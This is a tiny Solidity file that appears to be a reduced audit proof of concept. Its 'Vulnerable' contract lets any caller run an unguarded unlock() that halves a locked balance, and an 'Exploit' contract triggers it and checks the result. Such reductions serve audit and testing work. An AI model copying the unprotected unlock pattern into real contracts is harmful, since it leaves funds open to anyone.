// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// AuditVault 20308: Zerem unlockExponent handling. Reduced local model preserves the reported state transition.

contract Vulnerable {
    uint256 public locked = 100; uint256 public unlockExponent = 2; function unlock() external { locked -= locked / unlockExponent; }
}

contract Exploit {
    Vulnerable public bug;
    bool public success;

    constructor() {
        bug = new Vulnerable();
    }

    function attack() external {
        bug.unlock(); success = bug.locked() == 50;
    }
}


